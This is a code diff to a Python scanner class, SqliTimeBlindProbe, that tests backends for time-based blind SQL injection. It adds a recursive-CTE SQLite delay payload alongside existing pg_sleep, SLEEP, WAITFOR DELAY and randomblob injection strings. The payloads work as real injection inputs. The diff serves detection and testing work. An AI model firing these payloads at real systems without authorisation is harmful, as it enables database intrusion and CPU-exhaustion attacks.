@@ -640,13 +640,25 @@ class SqliTimeBlindProbe(BackendProbe):
             baselines.append(time.monotonic() - t0)
         baseline = sum(baselines) / len(baselines)
 
+        # SQLite has no SLEEP/pg_sleep — we burn CPU instead. randomblob
+        # alone undershoots on fast hardware (200MB ≈ 0.3s on M-series) and
+        # OOMs at 1GB, so the dependable SQLite payload is a recursive CTE:
+        # ~10M rows of an integer counter takes ~1s and scales linearly, so
+        # `sleep_seconds * 10M` rows yields ~sleep_seconds seconds of work
+        # across architectures without memory pressure.
+        sqlite_cte_rows = int(sleep_seconds * 10_000_000)
         sleep_payloads = [
             f"' OR pg_sleep({sleep_seconds})--",
             f"1' OR SLEEP({sleep_seconds})-- -",
             f"'); SELECT pg_sleep({sleep_seconds});--",
             f"1 AND SLEEP({sleep_seconds})",
             f"'; WAITFOR DELAY '0:0:{int(sleep_seconds)}'--",
-            f"1' AND randomblob({int(sleep_seconds * 100000000)})--",  # SQLite CPU-burn, approximates sleep
+            f"1' AND randomblob({int(sleep_seconds * 100_000_000)})--",
+            (
+                "1' AND (SELECT count(*) FROM ("
+                f"WITH RECURSIVE c(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM c LIMIT {sqlite_cte_rows})"
+                " SELECT * FROM c)) > 0--"
+            ),
         ]
         attempts: list[dict] = []
         positive_hit: dict | None = None
